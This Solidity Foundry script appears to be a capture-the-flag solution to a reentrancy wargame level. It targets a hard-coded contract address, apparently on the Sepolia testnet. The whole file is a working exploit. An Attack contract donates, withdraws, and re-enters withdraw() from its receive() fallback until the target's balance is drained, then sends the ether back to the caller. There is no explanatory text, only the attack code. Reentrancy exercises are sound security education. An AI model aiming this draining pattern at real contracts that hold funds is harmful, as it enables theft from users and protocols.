// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Reentrance} from "../src/Reentrancy.sol";

contract ReentrancySolve is Script{
    Reentrance public reentrance = Reentrance(0xD063dA7e4876694Cf31a23c7bb61e38184FD5B02);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Initial Balance : ", address(reentrance).balance);

        new Attack().exploit{value: 0.001 ether}();

        console.log("Final Balance : ", address(reentrance).balance);
        vm.stopBroadcast();
    }
}

contract Attack{
    Reentrance public reentrance = Reentrance(0xD063dA7e4876694Cf31a23c7bb61e38184FD5B02);

    function exploit() public payable{
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);

        // I need my sepolia back
        msg.sender.call{value : address(this).balance}("");
    }

    receive() payable external{
        if (address(reentrance).balance >= 0.001 ether){
            reentrance.withdraw(0.001 ether);
        }
    }
}